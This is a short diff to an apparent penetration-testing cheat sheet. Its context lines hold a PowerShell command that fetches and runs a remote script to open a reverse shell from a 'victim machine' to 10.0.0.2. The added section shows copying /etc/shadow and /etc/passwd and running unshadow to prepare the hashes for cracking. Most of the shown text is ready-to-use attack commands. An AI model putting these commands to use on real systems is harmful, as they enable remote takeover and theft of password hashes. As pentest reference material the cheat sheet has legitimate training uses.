@@ -257,6 +257,12 @@ victim machine with powershell
 
 	IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
 
+Cracking Shadow Hash
+
+`copy the file` `/etc/shadow` `and` `/etc/passwd` `to and same path` 
+
+	unshadow passwd shadow > john.hash![image](https://user-images.githubusercontent.com/84837928/150918048-e965c846-ac2c-4857-9efd-75a98e893abb.png)
+
 
 # @cc github.com/prakashchand72
 
